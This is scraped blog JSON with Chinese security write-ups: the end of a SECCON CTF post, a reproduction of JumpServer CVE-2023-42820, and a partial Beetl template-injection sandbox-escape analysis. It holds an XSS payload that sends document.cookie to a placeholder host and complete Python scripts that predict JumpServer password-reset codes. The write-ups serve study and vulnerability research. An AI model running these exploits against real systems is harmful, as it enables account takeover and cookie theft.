res.type(\u0026#34;html\u0026#34;).send(indexHtml)) .get(\u0026#34;/view\u0026#34;, (req, res) =\u0026gt; { const html = String(req.query.html ?? \u0026#34;?\u0026#34;).slice(0, 1024); if ( req.header(\u0026#34;Sec-Fetch-Site\u0026#34;) === \u0026#34;same-origin\u0026#34; \u0026amp;\u0026amp; req.header(\u0026#34;Sec-Fetch-Dest\u0026#34;) !== \u0026#34;document\u0026#34; ) { // XSS detection is unnecessary because it is definitely impossible for this request to trigger an XSS attack. res.type(\u0026#34;html\u0026#34;).send(html); return; } if (/script|src|on|html|data|\u0026amp;/i.test(html)) { res.type(\u0026#34;text\u0026#34;).send(`XSS Detected: ${html}`); } else { res.type(\u0026#34;html\u0026#34;).send(html); } }) .listen(3000); 直接通过url访问Sec-Fetch-Dest时document。通过html标签访问即可。\n思路是先直接访问/view，再通过iframe或embed同源嵌入/view页面，此时无waf限制，可以触发xss。\n\u0026lt;embed code=\u0026#34;http://localhost:3000/view?html=\u0026#34; type=\u0026#34;text/html\u0026#34;\u0026gt; html中属性会自动去除部分特殊字符，使用换行绕过即可。\npayload：\n%3Cembed%20code%3D%22%2Fview%3Fht%0Aml%3D%253Cscr%0Aipt%253Efetch%2528%2527http%253A%252F%252Fip%253Aport%252F%253Fflag%253D%2527%2520%252B%2520encodeURI%2528document%252Ecookie%2529%2529%253B%253C%252Fscr%0Aipt%253E%22%20type%3Dtext%2Fht%0Aml%3E ","permalink":"https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-seccon_ctf_13th_quals-alpacahack_round_7/","summary":"SECCON CTF 13th Quals Trillion_Bank 题目代码：\nimport fastify from \u0026#34;fastify\u0026#34;; import crypto from \u0026#34;node:crypto\u0026#34;; import fs from \u0026#34;node:fs/promises\u0026#34;; import db from \u0026#34;./db.js\u0026#34;; const FLAG = process.env.FLAG ?? console.log(\u0026#34;No flag\u0026#34;) ?? process.exit(1); const TRILLION = 1_000_000_000_000; const app = fastify(); app.register(await import(\u0026#34;@fastify/jwt\u0026#34;), { secret: crypto.randomBytes(32), cookie: { cookieName: \u0026#34;session\u0026#34; }, }); app.register(await import(\u0026#34;@fastify/cookie\u0026#34;)); const names = new Set(); const auth = async (req, res) =\u0026gt; { try { await req.jwtVerify(); } catch { return res.","title":"CTF记录-SECCON_CTF_13th_Quals, AlpacaHack_Round_7"},{"content":"环境 Jumpserver \u0026lt;= v3.6.4中存在CVE-2023-42820漏洞，可以预测随机数导致验证码预测。\n环境搭建\nvulnhub或者官网\n漏洞分析 github diff如下https://github.com/jumpserver/jumpserver/commit/ce645b1710c5821119f313e1b3d801470565aac0\nrandom_string函数用于生成密码重置的验证码，去掉了random的seed，所以代码中应该有地方可以设置可控seed。\njumpserver v3.6.4使用了django-simple-captcha v0.5.18来生成验证码，而此版本中在captcha_image函数中设置了种子，但结束后未将其置空。\n图片验证码逻辑 captcha相关路由如下：\nurlpatterns = [ re_path( r\u0026#34;image/(?P\u0026lt;key\u0026gt;\\w+)/$\u0026#34;, views.captcha_image, name=\u0026#34;captcha-image\u0026#34;, kwargs={\u0026#34;scale\u0026#34;: 1}, ), re_path( r\u0026#34;image/(?P\u0026lt;key\u0026gt;\\w+)@2/$\u0026#34;, views.captcha_image, name=\u0026#34;captcha-image-2x\u0026#34;, kwargs={\u0026#34;scale\u0026#34;: 2}, ), re_path(r\u0026#34;audio/(?P\u0026lt;key\u0026gt;\\w+).wav$\u0026#34;, views.captcha_audio, name=\u0026#34;captcha-audio\u0026#34;), re_path(r\u0026#34;refresh/$\u0026#34;, views.captcha_refresh, name=\u0026#34;captcha-refresh\u0026#34;), ] 验证码刷新代码：\ndef captcha_refresh(request): \u0026#34;\u0026#34;\u0026#34;Return json with new captcha for ajax refresh request\u0026#34;\u0026#34;\u0026#34; if not request.headers.get(\u0026#34;x-requested-with\u0026#34;) == \u0026#34;XMLHttpRequest\u0026#34;: raise Http404 new_key = CaptchaStore.pick() ...... @classmethod def generate_key(cls, generator=None): challenge, response = captcha_settings.get_challenge(generator)() store = cls.objects.create(challenge=challenge, response=response) return store.hashkey @classmethod def pick(cls): if not captcha_settings.CAPTCHA_GET_FROM_POOL: return cls.generate_key() def fallback(): logger.error(\u0026#34;Couldn\u0026#39;t get a captcha from pool, generating\u0026#34;) return cls.generate_key() # Pick up a random item from pool minimum_expiration = timezone.now() + datetime.timedelta( minutes=int(captcha_settings.CAPTCHA_GET_FROM_POOL_TIMEOUT) ) store = ( cls.objects.filter(expiration__gt=minimum_expiration).order_by(\u0026#34;?\u0026#34;).first() ) return (store and store.hashkey) or fallback() CAPTCHA_GET_FROM_POOL默认为False，pick通过get_chanllenge查找生成chal的函数并调用\njumpserver默认有如下设置:\nCAPTCHA_IMAGE_SIZE = (180, 38) CAPTCHA_FOREGROUND_COLOR = \u0026#39;#001100\u0026#39; CAPTCHA_NOISE_FUNCTIONS = (\u0026#39;captcha.helpers.noise_dots\u0026#39;,) CAPTCHA_CHALLENGE_FUNCT = \u0026#39;captcha.helpers.math_challenge\u0026#39; math_challenge用于生成简单的数学计算题。\ndef math_challenge(): operators = (\u0026#34;+\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;-\u0026#34;) operands = (random.randint(1, 10), random.randint(1, 10)) operator = random.choice(operators) if operands[0] \u0026lt; operands[1] and \u0026#34;-\u0026#34; == operator: operands = (operands[1], operands[0]) challenge = \u0026#34;%d%s%d\u0026#34; % (operands[0], operator, operands[1]) return ( \u0026#34;{}=\u0026#34;.format(challenge.replace(\u0026#34;*\u0026#34;, settings.CAPTCHA_MATH_CHALLENGE_OPERATOR)), str(eval(challenge)), ) 验证码刷新流程为：\n通过math_challenge生成简单算术题 将题目和答案保存 通过store.hashkey生成题目hash，将hash作为key返回 后续可根据此key获取图片。由captcha_image函数生成图片。\ncaptcha_image代码如下：\ndef captcha_image(request, key, scale=1): if scale == 2 and not settings.CAPTCHA_2X_IMAGE: raise Http404 try: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) random.seed(key) # Do not generate different images for the same key text = store.challenge if isinstance(settings.CAPTCHA_FONT_PATH, str): fontpath = settings.CAPTCHA_FONT_PATH elif isinstance(settings.CAPTCHA_FONT_PATH, (list, tuple)): fontpath = random.choice(settings.CAPTCHA_FONT_PATH) else: raise ImproperlyConfigured( \u0026#34;settings.CAPTCHA_FONT_PATH needs to be a path to a font or list of paths to fonts\u0026#34; ) if fontpath.lower().strip().endswith(\u0026#34;ttf\u0026#34;): font = ImageFont.truetype(fontpath, settings.CAPTCHA_FONT_SIZE * scale) else: font = ImageFont.load(fontpath) if settings.CAPTCHA_IMAGE_SIZE: size = settings.CAPTCHA_IMAGE_SIZE else: size = getsize(font, text) size = (size[0] * 2, int(size[1] * 1.4)) image = makeimg(size) xpos = 2 charlist = [] for char in text: if char in settings.CAPTCHA_PUNCTUATION and len(charlist) \u0026gt;= 1: charlist[-1] += char else: charlist.append(char) for char in charlist: fgimage = Image.new(\u0026#34;RGB\u0026#34;, size, settings.CAPTCHA_FOREGROUND_COLOR) charimage = Image.new(\u0026#34;L\u0026#34;, getsize(font, \u0026#34; %s \u0026#34; % char), \u0026#34;#000000\u0026#34;) chardraw = ImageDraw.Draw(charimage) chardraw.text((0, 0), \u0026#34; %s \u0026#34; % char, font=font, fill=\u0026#34;#ffffff\u0026#34;) if settings.CAPTCHA_LETTER_ROTATION: charimage = charimage.rotate( random.randrange(*settings.CAPTCHA_LETTER_ROTATION), expand=0, resample=Image.BICUBIC, ) charimage = charimage.crop(charimage.getbbox()) maskimage = Image.new(\u0026#34;L\u0026#34;, size) ...... for f in settings.noise_functions(): draw = f(draw, image) for f in settings.filter_functions(): image = f(image) ...... return response 先将key作为seed传入，后续需要计算random操作调用了多少次，姑且称其为偏移吧。\nsettings.CAPTCHA_FONT_PATH默认有值，不会调用random.choice\n之后会对text也就是算术题进行处理，会调用random.randrange(*settings.CAPTCHA_LETTER_ROTATION)，调用次数不确定。\n在noise_functions()中jumpserver设置为了captcha.helpers.noise_arcs和captcha.helpers.noise_dots，其中captcha.helpers.noise_dots会调用random。代码如下：\ndef noise_dots(draw, image): size = image.size for p in range(int(size[0] * size[1] * 0.1)): draw.point( (random.randint(0, size[0]), random.randint(0, size[1])), fill=settings.CAPTCHA_FOREGROUND_COLOR, ) return draw 图片大小决定seed的偏移。而jumpserver设置了默认图片大小，就是上面提到的CAPTCHA_IMAGE_SIZE = (180, 38)，在captcha_image函数中读取并赋值。\n密码重置验证码逻辑 UserResetPasswordSendCodeApi类定义了验证码逻辑：\ntoken = request.GET.get(\u0026#39;token\u0026#39;) userinfo = cache.get(token) if not userinfo: return HttpResponseRedirect(reverse(\u0026#39;authentication:forgot-previewing\u0026#39;)) serializer = self.get_serializer(data=request.data) serializer.is_valid(raise_exception=True) username = userinfo.get(\u0026#39;username\u0026#39;) form_type = serializer.validated_data[\u0026#39;form_type\u0026#39;] code = random_string(6, lower=False, upper=False) ...... 漏洞利用 想要预测验证码达成以下条件：\n控制seed 可控seed的偏移 控制seed 通过路由/core/auth/captcha/image/{seed}/即可设置seed。需要注意：\n生成图片时会检查此key是否通过refresh生成：\ntry: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) 当一个验证码被使用后，对应的key会被删除，如果再次尝试设置seed为此key，会返回410错误，所以key不能复用。\n还有就是jumpserver会有多个进程进行监听，所以需要多次发包设置seed才能使所有进程的seed都被控制，提高成功率。\n计算random调用次数 noise_dots计算噪点以及最终生成code时调用次数都是固定的。不确定的地方是对challenge处理时调用次数会根据challenge内容决定。\n尝试枚举所有可能：\nlens = [] for i in range(1, 11): for l in range(1, 11): for p in [\u0026#39;*\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;+\u0026#39;]: sum = 0 text = \u0026#39;{}{}{}=\u0026#39;.format(str(i), p, str(l)) charlist = [] for char in text: if char in \u0026#34;_\\\u0026#34;\u0026#39;,.;:-\u0026#34; and len(charlist) \u0026gt;= 1: charlist[-1] += char else: charlist.append(char) for char in charlist: sum = sum + 1 if sum not in lens: lens.append(sum) lens.sort() print(lens) # [3, 4, 5, 6] 计算4次的概率最大。\n半自动利用 利用流程：\n浏览器进入发送验证码页面 在发送验证码之前运行脚本预测验证码 发送验证码 原理：先设置seed，然后用gen_img_flow模拟seed偏移。因为次数为4的概率最大，所以固定为4。此脚本有概率失败大概为30%\n脚本如下：\nimport requests import random import string import re url = \u0026#39;\u0026#39; string_punctuation = \u0026#39;!#$%\u0026amp;()*+,-.:;\u0026lt;=\u0026gt;?@[]^_~\u0026#39; key = None def gen_img_flow(n): CAPTCHA_LETTER_ROTATION = (-35, 35) size = (180, 38) for char in range(n): random.randrange(*CAPTCHA_LETTER_ROTATION) for p in range(int(size[0] * size[1] * 0.1)): random.randint(0, size[0]) random.randint(0, size[1]) def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = [\u0026#39;lower\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;special_char\u0026#39;] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f\u0026#39;Parameters {kwargs_keys} must have at least one `True`\u0026#39; assert length \u0026gt;= args_true_count, f\u0026#39;Expected length \u0026gt;= {args_true_count}, bug got {length}\u0026#39; can_startswith_special_char = args_true_count == 1 and special_char chars = \u0026#39;\u0026#39;.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026amp; set(args_string_map[k])): # 没有包含指定的字符, retry break else: if not can_startswith_special_char and password[0] in args_string_map[\u0026#39;special_char\u0026#39;]: # 首位不能为特殊字符, retry continue else: # 满足要求终止 while 循环 break password = \u0026#39;\u0026#39;.join(password) return password def set_seed(s : requests.Session): print(\u0026#39;[*] start set seed\u0026#39;) global key if key == None: res = s.get(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;) try: pattern = r\u0026#39;\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/\u0026#39; key = re.findall(pattern, res.text)[0] except: print(\u0026#39;[-] get key failed\u0026#39;) print(res.text) exit() if len(key) != 40 : print(\u0026#39;[-] key error\u0026#39;) exit() try: for i in range(10): res = s.get(url=url + \u0026#39;/core/auth/captcha/image/{}/\u0026#39;.format(key)) except: pass if __name__ == \u0026#39;__main__\u0026#39;: s = requests.Session() key = None set_seed(s) random.seed(key) gen_img_flow(4) code = random_string(6, lower=False, upper=False) print(code) 提升成功概率的尝试 上面的脚本有概率失败是因为，seed偏移不确定。要提升成功率要从此入手。\n如下图： 需要获取原本seed的值或者chal\n思路一 设置两次seed(不可行) 可以先设置seed1，再设置seed2，这样chal由seed1生成，code由seed2生成。\n看似很合理，但其实不可行，因为如果要通过seed1计算chal，需要知道seed1的偏移，这就又变成要获取在seed1之前的那个未知chal了。\n如图所示： 思路二 chal辅助计算(可行) 在设置seed之后，查看生成的chal，手动输入chal辅助计算。\n如图： 虽说100%准确，但很麻烦，不用chal辅助正确率也能有60%以上了，意义不大。\nimport requests import random import string import re import PIL url = \u0026#39;\u0026#39; string_punctuation = \u0026#39;!#$%\u0026amp;()*+,-.:;\u0026lt;=\u0026gt;?@[]^_~\u0026#39; key = None def gen_img_flow(n): CAPTCHA_LETTER_ROTATION = (-35, 35) size = (180, 38) for char in range(n): random.randrange(*CAPTCHA_LETTER_ROTATION) for p in range(int(size[0] * size[1] * 0.1)): random.randint(0, size[0]) random.randint(0, size[1]) def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = [\u0026#39;lower\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;special_char\u0026#39;] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f\u0026#39;Parameters {kwargs_keys} must have at least one `True`\u0026#39; assert length \u0026gt;= args_true_count, f\u0026#39;Expected length \u0026gt;= {args_true_count}, bug got {length}\u0026#39; can_startswith_special_char = args_true_count == 1 and special_char chars = \u0026#39;\u0026#39;.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026amp; set(args_string_map[k])): # 没有包含指定的字符, retry break else: if not can_startswith_special_char and password[0] in args_string_map[\u0026#39;special_char\u0026#39;]: # 首位不能为特殊字符, retry continue else: # 满足要求终止 while 循环 break password = \u0026#39;\u0026#39;.join(password) return password def set_seed(s : requests.Session): print(\u0026#39;[*] start set seed\u0026#39;) global key if key == None: res = s.get(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;) try: pattern = r\u0026#39;\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/\u0026#39; key = re.findall(pattern, res.text)[0] except: print(\u0026#39;[-] get key failed\u0026#39;) print(res.text) exit() if len(key) != 40 : print(\u0026#39;[-] key error\u0026#39;) exit() try: for i in range(10): res = s.get(url=url + \u0026#39;/core/auth/captcha/image/{}/\u0026#39;.format(key)) if i == 0: f = open(\u0026#39;./out/out.png\u0026#39;.format(str(i)), \u0026#39;wb\u0026#39;) f.write(res.content) f.close() except: pass if __name__ == \u0026#39;__main__\u0026#39;: s = requests.Session() key = None set_seed(s) img = PIL.Image.open(\u0026#39;./out/out.png\u0026#39;) img.show() chal = input(\u0026#34;chal : \u0026#34;).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;) random.seed(key) CAPTCHA_LETTER_ROTATION = (-35, 35) charlist = [] for char in chal: if char == \u0026#34;-\u0026#34; and len(charlist) \u0026gt;= 1: charlist[-1] += char else: charlist.append(char) for char in range(4): random.randrange(*CAPTCHA_LETTER_ROTATION) gen_img_flow(0) code = random_string(6, lower=False, upper=False) print(code) 思路三 自动校准偏移(不可行) 流程如下：\n先设置seed1 访问/core/auth/password/forget/previewing/路由刷新验证码，此时seed变为seed2，chal由seed1生成。 枚举由seed1生成的chal的四种可能，选择可能性最高尝试提交form。使用while 循环重复1-3步骤。如果验证码检验通过则break。 循环break说明seed2和chal均确定，此时可以准确计算code了。 验证码通过就代表偏移设置为4的情况生成的chal是正确的。\n流程图： 此时可以看到一个问题，如果要校准seed2的偏移必须要提交form通过验证码检验，但上文中的代码审计得知，一个seed对应的chal使用过一次就不能再用了，所以重新设置seed2会失败，返回410错误：\ntry: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) 所以这个方法不可行。不过还是把脚本贴上来吧：\nimport requests import random import string import re url = \u0026#39;\u0026#39; string_punctuation = \u0026#39;!#$%\u0026amp;()*+,-.:;\u0026lt;=\u0026gt;?@[]^_~\u0026#39; key = None def gen_img_flow(n): CAPTCHA_LETTER_ROTATION = (-35, 35) size = (180, 38) for char in range(n): random.randrange(*CAPTCHA_LETTER_ROTATION) for p in range(int(size[0] * size[1] * 0.1)): random.randint(0, size[0]) random.randint(0, size[1]) def math_challenge(): operators = (\u0026#34;+\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;-\u0026#34;) operands = (random.randint(1, 10), random.randint(1, 10)) operator = random.choice(operators) if operands[0] \u0026lt; operands[1] and \u0026#34;-\u0026#34; == operator: operands = (operands[1], operands[0]) challenge = \u0026#34;%d%s%d\u0026#34; % (operands[0], operator, operands[1]) return ( \u0026#34;{}=\u0026#34;.format(challenge.replace(\u0026#34;*\u0026#34;, \u0026#34;*\u0026#34;)), str(eval(challenge)), ) def random_string(length: int, lower=True, upper=True, digit=True, special_char=False): args_names = [\u0026#39;lower\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;digit\u0026#39;, \u0026#39;special_char\u0026#39;] args_values = [lower, upper, digit, special_char] args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation] args_string_map = dict(zip(args_names, args_string)) kwargs = dict(zip(args_names, args_values)) kwargs_keys = list(kwargs.keys()) kwargs_values = list(kwargs.values()) args_true_count = len([i for i in kwargs_values if i]) assert any(kwargs_values), f\u0026#39;Parameters {kwargs_keys} must have at least one `True`\u0026#39; assert length \u0026gt;= args_true_count, f\u0026#39;Expected length \u0026gt;= {args_true_count}, bug got {length}\u0026#39; can_startswith_special_char = args_true_count == 1 and special_char chars = \u0026#39;\u0026#39;.join([args_string_map[k] for k, v in kwargs.items() if v]) while True: password = list(random.choice(chars) for i in range(length)) for k, v in kwargs.items(): if v and not (set(password) \u0026amp; set(args_string_map[k])): # 没有包含指定的字符, retry break else: if not can_startswith_special_char and password[0] in args_string_map[\u0026#39;special_char\u0026#39;]: # 首位不能为特殊字符, retry continue else: # 满足要求终止 while 循环 break password = \u0026#39;\u0026#39;.join(password) return password def set_seed(s : requests.Session): print(\u0026#39;[*] start set seed\u0026#39;) global key if key == None: res = s.get(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;) try: pattern = r\u0026#39;\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/\u0026#39; key = re.findall(pattern, res.text)[0] except: print(\u0026#39;[-] get key failed\u0026#39;) print(res.text) exit() if len(key) != 40 : print(\u0026#39;[-] key error\u0026#39;) exit() try: for i in range(10): res = s.get(url=url + \u0026#39;/core/auth/captcha/image/{}/\u0026#39;.format(key)) except: pass def get_reset_page_1(s : requests.Session) -\u0026gt; tuple[str, str]: print(\u0026#34;[*] start to get captcha0\u0026#34;) res = s.get(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;) key_pattern = r\u0026#39;\\/core\\/auth\\/captcha\\/image\\/([a-f0-9]{40})\\/\u0026#39; csrf_token_pattern = r\u0026#39;name=\u0026#34;csrfmiddlewaretoken\u0026#34; value=\u0026#34;(.*)\u0026#34;\u0026#39; try: key = re.findall(key_pattern, res.text)[0] csrf_token = re.findall(csrf_token_pattern, res.text)[0] if len(key) == 40 and len(csrf_token) \u0026gt; 0: print(\u0026#34;[+] get captcha0 success\u0026#34;) return (key, csrf_token) except Exception as e: print(e) print(\u0026#34;[-] get captcha0 failed\u0026#34;) exit() def send_captcha(s : requests.Session, captcha_0 : str, captcha_1 : str, csrf_token : str) -\u0026gt; str: data = { \u0026#34;csrfmiddlewaretoken\u0026#34; : csrf_token, \u0026#34;username\u0026#34; : \u0026#34;admin\u0026#34;, \u0026#34;captcha_0\u0026#34; : captcha_0, \u0026#34;captcha_1\u0026#34; : captcha_1 } res = s.post(url=url + \u0026#39;/core/auth/password/forget/previewing/\u0026#39;, data=data, allow_redirects=False) if res.status_code == 302: token = res.headers.get(\u0026#34;Location\u0026#34;).split(\u0026#34;token=\u0026#34;)[-1] if len(token) \u0026gt; 0: return token return None if __name__ == \u0026#39;__main__\u0026#39;: while True: key = None s = requests.session() set_seed(s) # set seed + gen_img_flow captcha0_key, captcha0_csrf_token = get_reset_page_1(s) random.seed(key) gen_img_flow(4) chal, answer = math_challenge() token = send_captcha(s, captcha0_key, str(answer), captcha0_csrf_token) if token != None: break else: print(\u0026#34;captcha incorrect\u0026#34;) key = captcha0_key set_seed(s) random.seed(key) CAPTCHA_LETTER_ROTATION = (-35, 35) charlist = [] for char in chal: if char == \u0026#34;-\u0026#34; and len(charlist) \u0026gt;= 1: charlist[-1] += char else: charlist.append(char) for char in range(4): random.randrange(*CAPTCHA_LETTER_ROTATION) gen_img_flow(0) code = random_string(6, lower=False, upper=False) print(code) ","permalink":"https://zoiltin.github.io/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/","summary":"环境 Jumpserver \u0026lt;= v3.6.4中存在CVE-2023-42820漏洞，可以预测随机数导致验证码预测。\n环境搭建\nvulnhub或者官网\n漏洞分析 github diff如下https://github.com/jumpserver/jumpserver/commit/ce645b1710c5821119f313e1b3d801470565aac0\nrandom_string函数用于生成密码重置的验证码，去掉了random的seed，所以代码中应该有地方可以设置可控seed。\njumpserver v3.6.4使用了django-simple-captcha v0.5.18来生成验证码，而此版本中在captcha_image函数中设置了种子，但结束后未将其置空。\n图片验证码逻辑 captcha相关路由如下：\nurlpatterns = [ re_path( r\u0026#34;image/(?P\u0026lt;key\u0026gt;\\w+)/$\u0026#34;, views.captcha_image, name=\u0026#34;captcha-image\u0026#34;, kwargs={\u0026#34;scale\u0026#34;: 1}, ), re_path( r\u0026#34;image/(?P\u0026lt;key\u0026gt;\\w+)@2/$\u0026#34;, views.captcha_image, name=\u0026#34;captcha-image-2x\u0026#34;, kwargs={\u0026#34;scale\u0026#34;: 2}, ), re_path(r\u0026#34;audio/(?P\u0026lt;key\u0026gt;\\w+).wav$\u0026#34;, views.captcha_audio, name=\u0026#34;captcha-audio\u0026#34;), re_path(r\u0026#34;refresh/$\u0026#34;, views.captcha_refresh, name=\u0026#34;captcha-refresh\u0026#34;), ] 验证码刷新代码：\ndef captcha_refresh(request): \u0026#34;\u0026#34;\u0026#34;Return json with new captcha for ajax refresh request\u0026#34;\u0026#34;\u0026#34; if not request.headers.get(\u0026#34;x-requested-with\u0026#34;) == \u0026#34;XMLHttpRequest\u0026#34;: raise Http404 new_key = CaptchaStore.pick() ...... @classmethod def generate_key(cls, generator=None): challenge, response = captcha_settings.get_challenge(generator)() store = cls.","title":"Jumpserver随机数预测漏洞(CVE-2023-42820)复现"},{"content":"本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n前言 拿到了前段时间ciscn 2024 final的web题附件，来复现一下Fobee这道题，顺便学习一下beetl的模板注入。\n3.15.x及以前的版本 过滤的很少，随便绕过。贴几个公开的poc： https://gitee.com/xiandafu/beetl/issues/I6RUIP https://gitee.com/xiandafu/beetl/issues/I914H3\n3.16.0 3.16.0是题目使用的版本也是本文使用的版本。\n测试环境为java8u65， beetl 3.16.0， solon 2.8.5\n入口 @Mapping(\u0026#34;/render\u0026#34;) public ModelAndView render(String pass, String tp) throws Exception { ModelAndView model = new ModelAndView(\u0026#34;render.htm\u0026#34;); if (pass != null \u0026amp;\u0026amp; pass.equals(password)) { byte[] decode = Base64.getDecoder().decode(tp); String result = BeetlKit.render(new String(decode), new HashMap()); System.out.println(result); model.put(\u0026#34;msg\u0026#34;, getMD5Hash(result)); } else { model.put(\u0026#34;msg\u0026#34;, \u0026#34;Render Page\u0026#34;); } return model; } 渲染过程 由renderTo进入execute函数。然后遍历所有要执行的语句然后依次执行。 每条语句的具体执行代码在org.beetl.core.statement.NativeCallExpression#evaluate函数。\npublic Object evaluate(Context ctx) { Class targetCls = null; Object targetObj = null; NativeNode lastNode = null; if (insNode != null) { targetObj = insNode.ref.evaluate(ctx); if (targetObj != null) { targetCls = targetObj.getClass(); } lastNode = insNode; } else { targetCls = ctx.gt.loadClassBySimpleName(this.clsNode.clazz); if (targetCls == null) { throw new BeetlException(BeetlException.NATIVE_CALL_EXCEPTION, \u0026#34;该类不存在\u0026#34;) .pushToken(GrammarToken.createToken(clsNode.clazz, token.line)); } lastNode = clsNode; } for (NativeNode node : chain) { ... ... } else if (node instanceof NativeMethodNode) { NativeMethodNode methodNode = (NativeMethodNode) node; String method = methodNode.method; Expression[] expList = methodNode.params; this.checkPermit(ctx, targetCls, targetObj, method); Object[] args = expList.length == 0 ? ObjectUtil.EMPTY_OBJECT_ARRAY : new Object[expList.length]; Class[] parameterType = new Class[args.length]; for (int i = 0; i \u0026lt; expList.length; i++) { args[i] = expList[i].evaluate(ctx); parameterType[i] = args[i] == null ? null : args[i].getClass(); } this.checkNull(targetCls, lastNode); ObjectMethodMatchConf mf = ObjectUtil.findMethod(targetCls, method, parameterType); if (mf == null) { throw new BeetlException(BeetlParserException.NATIVE_CALL_INVALID, \u0026#34;根据参数未找到匹配的方法\u0026#34; + method + BeetlUtil.getParameterDescription(parameterType)) .pushToken(GrammarToken.createToken(token.text, token.line)); } if (targetObj == null \u0026amp;\u0026amp; !Modifier.isStatic(mf.method.getModifiers())) { throw new BeetlException(BeetlException.NULL) .pushToken(GrammarToken.createToken(token.text, token.line)); } try { if(mf.contextRequired){ ArrayList tempList = new ArrayList(Arrays.asList(args)); tempList.add(ctx); args = tempList.toArray(); } targetObj = ObjectUtil.invoke(targetObj, mf, args); targetCls = targetObj == null ? null : targetObj.getClass(); ... ... } lastNode = node; } return targetObj; } 黑名单主要针对方法调用，其他代码省略。\nbeetl将每条语句拆分为targetCls，targetObj，method和args。在org.beetl.core.DefaultNativeSecurityManager#permit函数中对targetCls进行检查：\npublic boolean permit(Object resourceId, Class c, Object target, String method) { if (c.isArray()) { // 允许调用，但实际上会在在其后调用中报错。不归此处管理 return true; } String name = c.getName(); String className = null; String pkgName = null; int i = name.lastIndexOf(\u0026#39;.\u0026#39;); if (i != -1) { pkgName = name.substring(0, i); className = name.substring(i + 1); } else { // 无包名，允许调用 return true; } if (pkgName.startsWith(\u0026#34;java.lang.reflect\u0026#34;)) { //反射类，不允许调用 https://gitee.com/xiandafu/beetl/issues/I8RU01 return false; } if (pkgName.startsWith(\u0026#34;java.lang\u0026#34;)) { return !className.equals(\u0026#34;Runtime\u0026#34;) \u0026amp;\u0026amp; !className.equals(\u0026#34;Process\u0026#34;) \u0026amp;\u0026amp; !className.equals(\u0026#34;ProcessBuilder\u0026#34;) \u0026amp;\u0026amp; !className.equals(\u0026#34;Thread\u0026#34;) // https://gitee.com/xiandafu/beetl/issues/I6RUIP \u0026amp;\u0026amp; !className.equals(\u0026#34;Class\u0026#34;) //https://gitee.com/xiandafu/beetl/issues/I6RUIP#note_17223442 \u0026amp;\u0026amp; !className.equals(\u0026#34;System\u0026#34;) ; } if(pkgName.startsWith(\u0026#34;java.beans\u0026#34;)){ //https://gitee.com/xiandafu/beetl/issues/I914H3#note_24939039 return false; } if(pkgName.startsWith(\u0026#34;org.beetl\u0026#34;)){ //https://gitee.com/xiandafu/beetl/issues/I6RUIP return false; } if(pkgName.startsWith(\u0026#34;javax.\u0026#34;)){ return false; } if(pkgName.startsWith(\u0026#34;sun.\u0026#34;)){ return false; } return true; } 在此处执行getRuntime时targetCls为java.lang.Runtime，pkgName位java.lang，被限制了，check不通过。 如果check通过，会解析参数并invoke对应函数：\ntargetObj = ObjectUtil.invoke(targetObj, mf, args); 出网利用 没办法直接利用，尝试从solon和beetl代码中找找可利用的类。\norg.noear.solon.Utils类中有两个静态方法与反射有关：\npublic static Class\u0026lt;?\u0026gt; loadClass(String className) { return ClassUtil.loadClass(className); } public static \u0026lt;T\u0026gt; T newInstance(String className) { return ClassUtil.tryInstance(className); } 通过这两个方法可以实例化任意类。\nJdbcRowSetImpl没被过滤，可以尝试jndi注入。\n不出网利用 newInstance部分绕过了，还差invoke部分。\norg.noear.solon.core.wrap.MethodWrap类中实现了invoke功能：\npublic Object invoke(Object obj, Object[] args) throws Throwable { try { return method.invoke(obj, args); } catch (InvocationTargetException e) { Throwable e2 = e.getTargetException(); throw Utils.throwableUnwrap(e2); } } 